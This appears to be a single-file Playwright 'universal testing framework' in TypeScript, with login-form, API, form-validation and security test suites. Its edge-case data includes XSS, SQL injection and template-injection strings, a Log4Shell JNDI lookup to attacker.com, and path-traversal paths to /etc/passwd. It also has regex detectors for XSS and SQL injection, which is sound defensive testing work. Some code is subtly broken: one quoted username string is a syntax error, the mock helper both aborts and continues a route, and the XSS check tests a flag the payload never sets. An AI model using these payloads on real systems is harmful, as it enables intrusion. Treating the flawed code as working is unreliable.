/**
 * UNIVERSAL PLAYWRIGHT TESTING FRAMEWORK
 * 
 * A comprehensive, reusable framework for all types of testing:
 * - UI/E2E Testing
 * - API Testing
 * - Integration Testing
 * - Performance Testing
 * - Security Testing
 * 
 * Features:
 * - Positive, Negative, and Edge case testing
 * - Data-driven testing
 * - Custom assertions
 * - Page Object Model
 * - Report generation
 * - Parallel execution
 * - Test helpers and utilities
 */

import { test, expect, Page, APIRequestContext, APIResponse } from '@playwright/test';

// ============================================
// ENV CONFIGURATION & CONSTANTS
// ============================================

enum Environment {
  DEV = 'dev',
  STAGING = 'staging',
  PRODUCTION = 'production'
}

enum TestType {
  POSITIVE = 'positive',
  NEGATIVE = 'negative',
  EDGE = 'edge'
}

interface Config {
  baseUrl: string;
  apiUrl: string;
  environment: Environment;
  timeout: number;
  retries: number;
  slowMo: number;
  headless: boolean;
}

const configs: Record<Environment, Config> = {
  [Environment.DEV]: {
    baseUrl: 'http://localhost:3000',
    apiUrl: 'http://localhost:3001/api',
    environment: Environment.DEV,
    timeout: 30000,
    retries: 1,
    slowMo: 0,
    headless: true
  },
  [Environment.STAGING]: {
    baseUrl: 'https://staging.example.com',
    apiUrl: 'https://api-staging.example.com',
    environment: Environment.STAGING,
    timeout: 30000,
    retries: 2,
    slowMo: 0,
    headless: true
  },
  [Environment.PRODUCTION]: {
    baseUrl: 'https://www.example.com',
    apiUrl: 'https://api.example.com',
    environment: Environment.PRODUCTION,
    timeout: 60000,
    retries: 3,
    slowMo: 0,
    headless: true
  }
};

const currentEnv = process.env.ENV as Environment || Environment.DEV;
const config = configs[currentEnv];

// ============================================
// TEST DATA GENERATORS
// ============================================

/**
 * Generates test data for different test case types
 */
class TestDataGenerator {
  /**
   * Generate positive test cases
   */
  static generatePositiveData() {
    return {
      email: 'validuser@example.com',
      password: 'SecurePass123!',
      username: 'validuser',
      name: 'John Doe',
      age: 25,
      phone: '+1234567890',
      amount: 100.50,
      date: new Date().toISOString(),
      url: 'https://example.com',
      zipcode: '12345',
      creditCard: '4111111111111111',
      cvv: '123'
    };
  }

  /**
   * Generate negative test cases - Invalid inputs
   */
  static generateNegativeData() {
    return {
      emails: [
        '', // empty
        'invalid-email', // no @
        '@example.com', // no local part
        'user@', // no domain
        'user @example.com', // spaces
        'user@example', // no TLD
        'user..name@example.com' // consecutive dots
      ],
      passwords: [
        '', // empty
        '123', // too short
        'password', // no special chars/numbers
        'PASSWORD123', // no lowercase
        'password123', // no uppercase
        'Pass', // too short
        'A'.repeat(256) // too long
      ],
      usernames: [
        '', // empty
        'a', // too short
        'user name', // spaces
        'user@name', // special chars
        'user\\'name' // escape chars
      ],
      ages: [-1, 0, 151, 999, -100, null, undefined, 'not-a-number'],
      amounts: [-100, -1, 0, 1000001, -0.01, 'not-a-number', null],
      phones: [
        '', // empty
        '123', // too short
        'not-a-phone',
        'phone number',
        '(invalid)'
      ],
      urls: [
        'not-a-url',
        'htp://example.com',
        '://example.com',
        'example',
        ''
      ],
      dates: [
        '', // empty
        'invalid-date',
        '2024-13-32', // invalid month/day
        '99-99-99',
        'not-a-date'
      ]
    };
  }

  /**
   * Generate edge case test data
   */
  static generateEdgeCaseData() {
    return {
      specialCharacters: [
        '!@#$%^&*()_+-={}[]|:;<>?,.',
        '<script>alert("xss")</script>',
        '\' OR 1=1 --',
        '${7*7}',
        '{{7*7}}',
        '<%=7*7%>',
        '${jndi:ldap://attacker.com/a}',
        '../../../etc/passwd',
        '../../windows/system32'
      ],
      unicodeCharacters: [
        '测试', // Chinese
        'Тест', // Russian
        '🚀📊🎯', // Emoji
        'tëst dâtâ', // Accented
        'ทดสอบ' // Thai
      ],
      boundaryValues: {
        minInt: 0,
        maxInt: 2147483647,
        minNegative: -2147483648,
        maxFloat: 3.4028235e+38,
        minFloat: 1.4012984e-45,
        emptyString: '',
        whitespaceOnly: '   ',
        singleChar: 'a',
        maxLength: 'a'.repeat(10000)
      },
      nullAndUndefined: [null, undefined],
      emptyCollections: [[], {}, new Map(), new Set()],
      largeData: 'x'.repeat(1000000) // 1MB string
    };
  }

  /**
   * Generate random test data
   */
  static generateRandomEmail(): string {
    return `user${Math.random().toString(36).substring(7)}@example.com`;
  }

  static generateRandomUsername(): string {
    return `user${Date.now()}`;
  }

  static generateRandomId(): string {
    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  }

  static generateRandomNumber(min: number = 0, max: number = 100): number {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }

  /**
   * Generate test data combinations
   */
  static generateTestMatrix(testType: TestType) {
    const baseData = this.generatePositiveData();
    const negData = this.generateNegativeData();
    const edgeData = this.generateEdgeCaseData();

    switch (testType) {
      case TestType.POSITIVE:
        return [
          { email: baseData.email, password: baseData.password, description: 'Valid email and password' },
          { email: 'user+alias@example.com', password: 'Pass123!@#', description: 'Email with alias and strong password' },
          { email: 'user.name@example.co.uk', password: 'P@ssw0rd!', description: 'Email with dots and complex domain' }
        ];

      case TestType.NEGATIVE:
        return negData.emails.map((email, idx) => ({
          email,
          password: baseData.password,
          description: `Invalid email: ${email || '(empty)'}`,
          shouldFail: true
        })).concat(
          negData.passwords.map((password, idx) => ({
            email: baseData.email,
            password,
            description: `Invalid password: ${password || '(empty)'}`,
            shouldFail: true
          }))
        );

      case TestType.EDGE:
        return [
          { email: edgeData.specialCharacters[0], password: baseData.password, description: 'Special characters in email', shouldFail: true },
          { email: baseData.email, password: edgeData.specialCharacters[1], description: 'XSS attempt in password', shouldFail: true },
          { email: edgeData.unicodeCharacters[0], password: baseData.password, description: 'Unicode characters in email', shouldFail: true },
          { email: baseData.email.repeat(100), password: baseData.password, description: 'Very long email', shouldFail: true },
          { email: baseData.email, password: edgeData.boundaryValues.maxLength, description: 'Maximum length password', shouldFail: true }
        ];

      default:
        return [];
    }
  }
}

// ============================================
// CUSTOM ASSERTIONS & MATCHERS
// ============================================

/**
 * Custom assertion helpers
 */
class CustomAssertions {
  /**
   * Assert element is in valid state
   */
  static async assertElementState(page: Page, selector: string, state: 'visible' | 'hidden' | 'enabled' | 'disabled') {
    const element = page.locator(selector);

    switch (state) {
      case 'visible':
        await expect(element).toBeVisible();
        break;
      case 'hidden':
        await expect(element).toBeHidden();
        break;
      case 'enabled':
        await expect(element).toBeEnabled();
        break;
      case 'disabled':
        await expect(element).toBeDisabled();
        break;
    }
  }

  /**
   * Assert error message appears
   */
  static async assertErrorMessage(page: Page, expectedMessage: string) {
    const errorSelectors = ['.error', '.alert-danger', '[role="alert"]', '[data-testid="error"]'];
    let found = false;

    for (const selector of errorSelectors) {
      if (await page.isVisible(selector)) {
        const text = await page.textContent(selector);
        if (text?.includes(expectedMessage)) {
          found = true;
          break;
        }
      }
    }

    expect(found).toBeTruthy();
  }

  /**
   * Assert success message appears
   */
  static async assertSuccessMessage(page: Page, expectedMessage: string) {
    const successSelectors = ['.success', '.alert-success', '[role="status"]', '[data-testid="success"]'];
    let found = false;

    for (const selector of successSelectors) {
      if (await page.isVisible(selector)) {
        const text = await page.textContent(selector);
        if (text?.includes(expectedMessage)) {
          found = true;
          break;
        }
      }
    }

    expect(found).toBeTruthy();
  }

  /**
   * Assert form validation
   */
  static async assertFormValidation(page: Page, formSelector: string, shouldBeValid: boolean) {
    const form = page.locator(formSelector);
    const isValid = await form.evaluate((el: any) => el?.checkValidity?.() ?? true);

    if (shouldBeValid) {
      expect(isValid).toBe(true);
    } else {
      expect(isValid).toBe(false);
    }
  }

  /**
   * Assert API response structure
   */
  static assertResponseStructure(response: any, expectedKeys: string[]) {
    for (const key of expectedKeys) {
      expect(response).toHaveProperty(key);
    }
  }
}

// ============================================
// PAGE OBJECT MODEL BASE CLASS
// ============================================

/**
 * Base page class for all pages
 */
class BasePage {
  protected page: Page;
  protected config: Config;

  constructor(page: Page) {
    this.page = page;
    this.config = config;
  }

  /**
   * Navigate to page
   */
  async goto(path: string = '') {
    await this.page.goto(`${this.config.baseUrl}${path}`);
    await this.page.waitForLoadState('networkidle');
  }

  /**
   * Fill form field
   */
  async fillField(selector: string, value: string, options?: { clear?: boolean; delay?: number }) {
    const element = this.page.locator(selector);
    await element.waitFor({ state: 'visible' });

    if (options?.clear) {
      await element.clear();
    }

    await element.fill(value, { delay: options?.delay || 0 });
  }

  /**
   * Click element
   */
  async click(selector: string, options?: { force?: boolean; timeout?: number }) {
    const element = this.page.locator(selector);
    await element.click({ force: options?.force, timeout: options?.timeout });
  }

  /**
   * Select dropdown option
   */
  async selectOption(selector: string, value: string) {
    await this.page.selectOption(selector, value);
  }

  /**
   * Get text content
   */
  async getText(selector: string): Promise<string> {
    return (await this.page.textContent(selector)) || '';
  }

  /**
   * Check if element is visible
   */
  async isVisible(selector: string): Promise<boolean> {
    return await this.page.isVisible(selector);
  }

  /**
   * Wait for element
   */
  async waitForElement(selector: string, timeout: number = 5000) {
    await this.page.waitForSelector(selector, { timeout });
  }

  /**
   * Upload file
   */
  async uploadFile(selector: string, filePath: string) {
    await this.page.setInputFiles(selector, filePath);
  }

  /**
   * Submit form
   */
  async submitForm(formSelector: string) {
    const submitButton = this.page.locator(`${formSelector} [type="submit"], ${formSelector} .submit-btn`);
    await submitButton.click();
  }

  /**
   * Get all form errors
   */
  async getFormErrors(): Promise<string[]> {
    const errors = await this.page.$$eval('[data-testid="error"], .error, .field-error', (elements: any[]) =>
      elements.map(el => el.textContent?.trim()).filter(Boolean)
    );
    return errors;
  }

  /**
   * Handle dialog (alert, confirm, prompt)
   */
  async handleDialog(action: 'accept' | 'dismiss', responseText?: string) {
    this.page.once('dialog', async dialog => {
      if (action === 'accept') {
        await dialog.accept(responseText);
      } else {
        await dialog.dismiss();
      }
    });
  }

  /**
   * Intercept and mock API requests
   */
  async mockApiResponse(urlPattern: string, responseData: any, status: number = 200) {
    await this.page.route(urlPattern, route => {
      route.abort('blockedbyclient');
      route.continue();
    });

    // Re-route with mock response
    await this.page.route(urlPattern, async route => {
      if (route.request().method() === 'POST' || route.request().method() === 'GET') {
        await route.fulfill({
          status,
          contentType: 'application/json',
          body: JSON.stringify(responseData)
        });
      }
    });
  }
}

// ============================================
// API CLIENT
// ============================================

/**
 * API client for testing REST endpoints
 */
class ApiClient {
  private baseUrl: string;
  private request: APIRequestContext;
  private token?: string;
  private headers: Record<string, string> = {};

  constructor(request: APIRequestContext, baseUrl: string) {
    this.request = request;
    this.baseUrl = baseUrl;
  }

  /**
   * Set authentication token
   */
  setToken(token: string) {
    this.token = token;
    this.headers['Authorization'] = `Bearer ${token}`;
  }

  /**
   * Set custom headers
   */
  setHeaders(headers: Record<string, string>) {
    this.headers = { ...this.headers, ...headers };
  }

  /**
   * GET request
   */
  async get(endpoint: string): Promise<APIResponse> {
    return this.request.get(`${this.baseUrl}${endpoint}`, {
      headers: this.headers
    });
  }

  /**
   * POST request
   */
  async post(endpoint: string, data: any): Promise<APIResponse> {
    return this.request.post(`${this.baseUrl}${endpoint}`, {
      headers: {
        'Content-Type': 'application/json',
        ...this.headers
      },
      data
    });
  }

  /**
   * PUT request
   */
  async put(endpoint: string, data: any): Promise<APIResponse> {
    return this.request.put(`${this.baseUrl}${endpoint}`, {
      headers: {
        'Content-Type': 'application/json',
        ...this.headers
      },
      data
    });
  }

  /**
   * DELETE request
   */
  async delete(endpoint: string): Promise<APIResponse> {
    return this.request.delete(`${this.baseUrl}${endpoint}`, {
      headers: this.headers
    });
  }

  /**
   * Validate API response
   */
  async validateResponse(response: APIResponse, expectedStatus: number, expectedKeys?: string[]) {
    expect(response.status()).toBe(expectedStatus);

    if (expectedKeys && response.status() === 200) {
      const data = await response.json();
      CustomAssertions.assertResponseStructure(data, expectedKeys);
    }
  }
}

// ============================================
// TEST DATA VALIDATORS
// ============================================

/**
 * Validate test data
 */
class DataValidator {
  /**
   * Validate email format
   */
  static isValidEmail(email: string): boolean {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  }

  /**
   * Validate password strength
   */
  static isValidPassword(password: string): boolean {
    const hasUpperCase = /[A-Z]/.test(password);
    const hasLowerCase = /[a-z]/.test(password);
    const hasNumbers = /\d/.test(password);
    const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password);
    const isLongEnough = password.length >= 8;

    return hasUpperCase && hasLowerCase && hasNumbers && hasSpecialChar && isLongEnough;
  }

  /**
   * Validate URL format
   */
  static isValidUrl(url: string): boolean {
    try {
      new URL(url);
      return true;
    } catch {
      return false;
    }
  }

  /**
   * Validate phone number
   */
  static isValidPhone(phone: string): boolean {
    const phoneRegex = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/;
    return phoneRegex.test(phone);
  }

  /**
   * Check for XSS vulnerability
   */
  static hasXSSVulnerability(input: string): boolean {
    const xssPatterns = [/<script[^>]*>/i, /javascript:/i, /on\w+\s*=/i];
    return xssPatterns.some(pattern => pattern.test(input));
  }

  /**
   * Check for SQL injection vulnerability
   */
  static hasSQLInjectionVulnerability(input: string): boolean {
    const sqlPatterns = [/('|(--)|;|(\/\*))/i, /(UNION|SELECT|INSERT|UPDATE|DELETE|DROP)/i];
    return sqlPatterns.some(pattern => pattern.test(input));
  }
}

// ============================================
// TEST EXECUTION HELPERS
// ============================================

/**
 * Helper for test execution and reporting
 */
class TestHelper {
  /**
   * Execute test step with error handling
   */
  static async executeStep(stepName: string, stepFunction: () => Promise<void>) {
    try {
      console.log(`Executing: ${stepName}`);
      await stepFunction();
      console.log(`✅ Passed: ${stepName}`);
    } catch (error) {
      console.error(`❌ Failed: ${stepName}`);
      throw error;
    }
  }

  /**
   * Retry failed test step
   */
  static async retryStep(stepName: string, stepFunction: () => Promise<void>, maxRetries: number = 3) {
    let lastError;

    for (let i = 0; i < maxRetries; i++) {
      try {
        await this.executeStep(`${stepName} (Attempt ${i + 1})`, stepFunction);
        return;
      } catch (error) {
        lastError = error;
        if (i < maxRetries - 1) {
          console.log(`Retrying... (${i + 1}/${maxRetries})`);
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
    }

    throw lastError;
  }

  /**
   * Wait for condition
   */
  static async waitForCondition(condition: () => Promise<boolean>, timeout: number = 5000) {
    const startTime = Date.now();

    while (Date.now() - startTime < timeout) {
      if (await condition()) {
        return true;
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    throw new Error(`Condition not met within ${timeout}ms`);
  }

  /**
   * Take screenshot on failure
   */
  static async takeScreenshotOnFailure(page: Page, testName: string) {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const screenshotPath = `./test-results/screenshots/${testName}-${timestamp}.png`;
    await page.screenshot({ path: screenshotPath });
  }

  /**
   * Generate test report
   */
  static generateTestReport(results: any[]) {
    const passed = results.filter(r => r.status === 'passed').length;
    const failed = results.filter(r => r.status === 'failed').length;
    const total = results.length;

    console.log('\n' + '='.repeat(60));
    console.log('TEST EXECUTION REPORT');
    console.log('='.repeat(60));
    console.log(`Total Tests: ${total}`);
    console.log(`Passed: ${passed} ✅`);
    console.log(`Failed: ${failed} ❌`);
    console.log(`Pass Rate: ${((passed / total) * 100).toFixed(2)}%`);
    console.log('='.repeat(60));

    if (failed === 0) {
      console.log('🎉 ALL TESTS PASSED!');
    } else {
      console.log(`⚠️  ${failed} tests failed`);
      results.filter(r => r.status === 'failed').forEach(r => {
        console.log(`  - ${r.name}: ${r.error}`);
      });
    }
  }
}

// ============================================
// EXAMPLE TEST SUITES
// ============================================

/**
 * POSITIVE TEST CASES - Happy Path
 */
test.describe('Positive Test Cases - Happy Path', () => {
  const testMatrix = TestDataGenerator.generateTestMatrix(TestType.POSITIVE);

  testMatrix.forEach((testCase, index) => {
    test(`POS-${index + 1}: ${testCase.description}`, async ({ page }) => {
      const basePage = new BasePage(page);

      // TODO: Update with your actual page path
      await TestHelper.executeStep('Navigate to login page', async () => {
        await basePage.goto('/login');
      });

      await TestHelper.executeStep('Fill email field', async () => {
        await basePage.fillField('[data-testid="email"]', testCase.email);
      });

      await TestHelper.executeStep('Fill password field', async () => {
        await basePage.fillField('[data-testid="password"]', testCase.password);
      });

      await TestHelper.executeStep('Submit form', async () => {
        await basePage.click('[data-testid="submit"]');
      });

      await TestHelper.executeStep('Verify success message', async () => {
        await CustomAssertions.assertSuccessMessage(page, 'Login successful');
      });
    });
  });
});

/**
 * NEGATIVE TEST CASES - Invalid Inputs
 */
test.describe('Negative Test Cases - Invalid Inputs', () => {
  const testMatrix = TestDataGenerator.generateTestMatrix(TestType.NEGATIVE);

  testMatrix.forEach((testCase, index) => {
    test(`NEG-${index + 1}: ${testCase.description}`, async ({ page }) => {
      const basePage = new BasePage(page);

      await TestHelper.executeStep('Navigate to login page', async () => {
        await basePage.goto('/login');
      });

      await TestHelper.executeStep('Fill form with invalid data', async () => {
        await basePage.fillField('[data-testid="email"]', testCase.email);
        await basePage.fillField('[data-testid="password"]', testCase.password);
      });

      await TestHelper.executeStep('Submit invalid form', async () => {
        await basePage.click('[data-testid="submit"]');
      });

      await TestHelper.executeStep('Verify error message', async () => {
        const errors = await basePage.getFormErrors();
        expect(errors.length).toBeGreaterThan(0);
      });
    });
  });
});

/**
 * EDGE CASE TEST CASES
 */
test.describe('Edge Case Test Cases', () => {
  const testMatrix = TestDataGenerator.generateTestMatrix(TestType.EDGE);

  testMatrix.forEach((testCase, index) => {
    test(`EDGE-${index + 1}: ${testCase.description}`, async ({ page }) => {
      const basePage = new BasePage(page);

      await TestHelper.executeStep('Navigate to login page', async () => {
        await basePage.goto('/login');
      });

      await TestHelper.executeStep('Fill form with edge case data', async () => {
        await basePage.fillField('[data-testid="email"]', testCase.email);
        await basePage.fillField('[data-testid="password"]', testCase.password);
      });

      // For edge cases, we typically expect the application to handle gracefully
      await TestHelper.executeStep('Submit form', async () => {
        await basePage.click('[data-testid="submit"]');
      });

      await TestHelper.executeStep('Verify appropriate handling', async () => {
        // Should either show error or handle gracefully without crashing
        const hasErrorOrSuccess = 
          await basePage.isVisible('[data-testid="error"]') ||
          await basePage.isVisible('[data-testid="success"]');
        expect(hasErrorOrSuccess).toBe(true);
      });
    });
  });
});

/**
 * API TESTING - POSITIVE CASES
 */
test.describe('API Testing - Positive Cases', () => {
  test('API-POS-001: Should create user with valid data', async ({ request }) => {
    const client = new ApiClient(request, config.apiUrl);
    const userData = TestDataGenerator.generatePositiveData();

    const response = await client.post('/users', {
      email: userData.email,
      name: userData.name,
      age: userData.age
    });

    expect(response.status()).toBe(201);
    const data = await response.json();
    expect(data).toHaveProperty('id');
  });

  test('API-POS-002: Should retrieve user data', async ({ request }) => {
    const client = new ApiClient(request, config.apiUrl);

    const response = await client.get('/users/1');

    expect(response.status()).toBe(200);
    const data = await response.json();
    expect(data).toHaveProperty('id');
    expect(data).toHaveProperty('email');
  });
});

/**
 * API TESTING - NEGATIVE CASES
 */
test.describe('API Testing - Negative Cases', () => {
  test('API-NEG-001: Should reject invalid email', async ({ request }) => {
    const client = new ApiClient(request, config.apiUrl);

    const response = await client.post('/users', {
      email: 'invalid-email',
      name: 'Test User',
      age: 25
    });

    expect([400, 422]).toContain(response.status());
  });

  test('API-NEG-002: Should return 404 for non-existent user', async ({ request }) => {
    const client = new ApiClient(request, config.apiUrl);

    const response = await client.get('/users/99999');

    expect(response.status()).toBe(404);
  });
});

/**
 * FORM VALIDATION TESTING
 */
test.describe('Form Validation Testing', () => {
  test('FORM-001: Empty required fields should show validation errors', async ({ page }) => {
    const basePage = new BasePage(page);

    await basePage.goto('/form');
    await basePage.submitForm('form');

    const errors = await basePage.getFormErrors();
    expect(errors.length).toBeGreaterThan(0);
  });

  test('FORM-002: Email field should validate format', async ({ page }) => {
    const basePage = new BasePage(page);
    const negativeEmails = TestDataGenerator.generateNegativeData().emails;

    await basePage.goto('/form');

    for (const email of negativeEmails.slice(0, 3)) {
      await basePage.fillField('[name="email"]', email);
      await basePage.submitForm('form');

      const errors = await basePage.getFormErrors();
      if (errors.length > 0) {
        expect(errors.some(e => e.toLowerCase().includes('email'))).toBe(true);
      }
    }
  });
});

/**
 * SECURITY TESTING
 */
test.describe('Security Testing', () => {
  test('SEC-001: XSS attacks should be prevented', async ({ page }) => {
    const basePage = new BasePage(page);
    const xssPayload = '<script>alert("XSS")</script>';

    // Check if input is vulnerable
    if (DataValidator.hasXSSVulnerability(xssPayload)) {
      console.log('⚠️  Potential XSS vulnerability detected in test payload');
    }

    await basePage.goto('/form');
    await basePage.fillField('[name="input"]', xssPayload);
    await basePage.submitForm('form');

    // Verify the script didn't execute
    const scriptExecuted = await page.evaluate(() => {
      return (window as any).xssExecuted === true;
    });

    expect(scriptExecuted).toBe(false);
  });

  test('SEC-002: SQL injection should be prevented', async ({ request }) => {
    const client = new ApiClient(request, config.apiUrl);
    const sqlPayload = "' OR '1'='1";

    if (DataValidator.hasSQLInjectionVulnerability(sqlPayload)) {
      console.log('⚠️  Potential SQL injection detected in test payload');
    }

    const response = await client.post('/search', {
      query: sqlPayload
    });

    // Should either reject or return safe results
    expect([200, 400]).toContain(response.status());
  });
});

/**
 * DATA VALIDATION TESTING
 */
test.describe('Data Validation Testing', () => {
  test('VALIDATE-001: Email validator should work correctly', () => {
    const validEmails = ['user@example.com', 'test.user@example.co.uk'];
    const invalidEmails = ['invalid-email', '@example.com', 'user@'];

    validEmails.forEach(email => {
      expect(DataValidator.isValidEmail(email)).toBe(true);
    });

    invalidEmails.forEach(email => {
      expect(DataValidator.isValidEmail(email)).toBe(false);
    });
  });

  test('VALIDATE-002: Password strength validator should work correctly', () => {
    const strongPasswords = ['SecurePass123!', 'Complex@Pass2024'];
    const weakPasswords = ['password', '123456', 'Pass'];

    strongPasswords.forEach(pass => {
      expect(DataValidator.isValidPassword(pass)).toBe(true);
    });

    weakPasswords.forEach(pass => {
      expect(DataValidator.isValidPassword(pass)).toBe(false);
    });
  });

  test('VALIDATE-003: URL validator should work correctly', () => {
    const validUrls = ['https://example.com', 'http://www.example.co.uk/path'];
    const invalidUrls = ['not-a-url', 'htp://example.com', 'example'];

    validUrls.forEach(url => {
      expect(DataValidator.isValidUrl(url)).toBe(true);
    });

    invalidUrls.forEach(url => {
      expect(DataValidator.isValidUrl(url)).toBe(false);
    });
  });
});

// ============================================
// TEST HOOKS & CONFIGURATION
// ============================================

test.beforeEach(async ({ page }) => {
  console.log(`\n🧪 Starting test: ${test.name}`);
  page.setDefaultTimeout(config.timeout);
});

test.afterEach(async ({ page }, testInfo) => {
  if (testInfo.status !== 'passed') {
    console.error(`❌ Test failed: ${testInfo.title}`);
    // Take screenshot on failure
    const screenshotPath = `./test-results/failures/${testInfo.title.replace(/\s+/g, '-')}.png`;
    await page.screenshot({ path: screenshotPath });
  }
});

// ============================================
// EXPORTS
// ============================================

export {
  TestDataGenerator,
  CustomAssertions,
  BasePage,
  ApiClient,
  DataValidator,
  TestHelper,
  TestType,
  Environment,
  Config,
  configs
};